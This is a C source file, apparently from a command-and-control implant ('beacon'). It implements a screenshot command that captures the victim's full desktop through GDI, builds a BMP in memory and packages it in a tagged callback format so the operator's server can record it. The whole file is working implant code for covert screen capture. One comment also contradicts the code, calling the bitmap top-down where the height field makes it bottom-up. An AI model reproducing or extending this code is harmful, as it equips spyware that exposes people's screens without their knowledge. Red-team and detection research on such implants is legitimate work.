/* beacon/src/Commands/Screenshot.c
 * CMD_SCREENSHOT (0x21) - capture desktop via GDI and return as a BMP wrapped in
 * the CALLBACK_AX_SCREENSHOT (0x81) tagged format so the server calls TsScreenshotAdd.
 *
 * Result layout (same as AxAddScreenshot BOF proxy):
 *   [0x81][note_len(4LE)=0][note(0)][bmp_len(4LE)][bmp_bytes]
 *
 * The BMP is a 24-bpp top-down Device-Independent Bitmap:
 *   BITMAPFILEHEADER (14 bytes) + BITMAPINFOHEADER (40 bytes) + pixel rows.
 * Row stride is DWORD-aligned: (width*3 + 3) & ~3. */

#include "Nax.h"
#include "Bof.h"
#include "Screenshot.h"

FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
    NaxDbg( Nax, "[scr] GetDC=%p BitBlt=%p GetDIBits=%p",
            (PVOID)Nax->User32.GetDC, (PVOID)Nax->Gdi32.BitBlt, (PVOID)Nax->Gdi32.GetDIBits );
    if ( !Nax->User32.GetDC || !Nax->Gdi32.BitBlt || !Nax->Gdi32.GetDIBits ) {
        NaxDbg( Nax, "[scr] GDI not available - user32/gdi32 not loaded" );
        return NAX_ERR_FAIL;
    }

    INT cx = Nax->User32.GetSystemMetrics( NX_SM_CXSCREEN );
    INT cy = Nax->User32.GetSystemMetrics( NX_SM_CYSCREEN );
    if ( cx <= 0 || cy <= 0 ) return NAX_ERR_FAIL;

    /* Capture screen */
    HDC     hdcSrc = Nax->User32.GetDC( NULL );
    if ( !hdcSrc ) return NAX_ERR_FAIL;

    HDC     hdcMem = Nax->Gdi32.CreateCompatibleDC( hdcSrc );
    HBITMAP hBmp   = Nax->Gdi32.CreateCompatibleBitmap( hdcSrc, cx, cy );
    if ( !hdcMem || !hBmp ) {
        if ( hBmp   ) Nax->Gdi32.DeleteObject( hBmp );
        if ( hdcMem ) Nax->Gdi32.DeleteDC( hdcMem );
        Nax->User32.ReleaseDC( NULL, hdcSrc );
        return NAX_ERR_FAIL;
    }

    HGDIOBJ hOld = Nax->Gdi32.SelectObject( hdcMem, hBmp );
    Nax->Gdi32.BitBlt( hdcMem, 0, 0, cx, cy, hdcSrc, 0, 0, NX_SRCCOPY );
    Nax->Gdi32.SelectObject( hdcMem, hOld );
    Nax->User32.ReleaseDC( NULL, hdcSrc );

    /* Compute sizes */
    UINT32 stride     = ( (UINT32)cx * 3u + 3u ) & ~3u;   /* DWORD-aligned 24bpp row */
    UINT32 pixel_sz   = stride * (UINT32)cy;
    UINT32 bmp_sz     = 14u + 40u + pixel_sz;             /* FILEHEADER + INFOHEADER + pixels */

    /* Result: [0x81][note_len=0(4)][bmp_len(4)][bmp] */
    UINT32 result_sz  = 1u + 4u + 4u + bmp_sz;
    if ( result_sz > *out_len ) {
        Nax->Gdi32.DeleteObject( hBmp );
        Nax->Gdi32.DeleteDC( hdcMem );
        return NAX_ERR_NOMEM;
    }

    PBYTE p = out;

    /* Type tag */
    *p++ = CALLBACK_AX_SCREENSHOT;

    /* note_len = 0 */
    *p++ = 0; *p++ = 0; *p++ = 0; *p++ = 0;

    /* bmp_len */
    NaxW32( p, bmp_sz ); p += 4;

    /* BITMAPFILEHEADER (14 bytes) */
    p[0] = 'B'; p[1] = 'M';
    NaxW32( p + 2,  bmp_sz );           /* bfSize       */
    NaxW32( p + 6,  0 );                /* bfReserved1+2 */
    NaxW32( p + 10, 14u + 40u );        /* bfOffBits    */
    p += 14;

    /* BITMAPINFOHEADER (40 bytes) */
    NaxW32( p,      40u );              /* biSize             */
    NaxW32( p + 4,  (UINT32)cx );       /* biWidth            */
    NaxW32( p + 8,  (UINT32)cy );       /* biHeight (positive = bottom-up) */
    p[12] = 1; p[13] = 0;             /* biPlanes = 1       */
    p[14] = 24; p[15] = 0;            /* biBitCount = 24    */
    NaxW32( p + 16, 0 );                /* biCompression = BI_RGB */
    NaxW32( p + 20, pixel_sz );         /* biSizeImage        */
    NaxW32( p + 24, 0 );                /* biXPelsPerMeter    */
    NaxW32( p + 28, 0 );                /* biYPelsPerMeter    */
    NaxW32( p + 32, 0 );                /* biClrUsed          */
    NaxW32( p + 36, 0 );                /* biClrImportant     */

    /* GetDIBits fills pixel data into p+40 using the BITMAPINFO at p */
    Nax->Gdi32.GetDIBits( hdcMem, hBmp, 0, (UINT)cy,
                          p + 40,
                          (PVOID)p,        /* BITMAPINFO* - reuses INFOHEADER above */
                          NX_DIB_RGB_COLORS );
    p += 40 + pixel_sz;

    Nax->Gdi32.DeleteObject( hBmp );
    Nax->Gdi32.DeleteDC( hdcMem );

    *out_len = result_sz;
    return NAX_OK;
}
